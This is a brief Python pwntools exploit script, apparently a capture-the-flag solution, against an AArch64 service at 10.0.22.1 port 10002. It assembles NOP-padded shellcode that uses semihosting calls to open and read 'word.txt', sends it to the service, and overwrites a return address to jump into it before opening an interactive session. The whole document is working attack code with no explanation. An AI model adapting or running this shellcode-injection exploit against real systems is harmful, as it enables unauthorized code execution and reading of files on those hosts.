#!/usr/bin/env python

# by Sean

from pwn import *

context.arch='aarch64'
s = asm('''
        sub sp, sp, 0x200

        adr x0, word
        mov x1, 0
        mov x2, 8
        str x0, [sp, 16]
        str x1, [sp, 24]
        str x2, [sp, 32]
        mov x0, 1
        add x1, sp, 16
        hlt 0xf000

        add x1, sp, 64
        mov x2, 100
        str x0, [sp, 16]
        str x1, [sp, 24]
        str x2, [sp, 32]
        mov x0, 6
        add x1, sp, 16
        hlt 0xf000

        add x0, sp, 64
        mov x8, 0x0184
        movk x8, 0x8000, lsl #16
        blr x8

        mov x30, 0x290
        movk x30, 0x8000, lsl 16
        br x30

    word:
        .asciz "word.txt"
''')

print 'size =', len(s)

s = asm('nop') * ((252 - len(s)) / 4) + s

r = remote('10.0.22.1', 10002)
#r = remote('127.0.0.1', 10002)

print r.recvuntil('Push Enter: ')
r.send(s + '\n')


print r.recvuntil('Input name: ')

context.log_level = 0


r.send(p64(0) + p64(0) + p64(0x80000710) + '\n')


r.interactive()
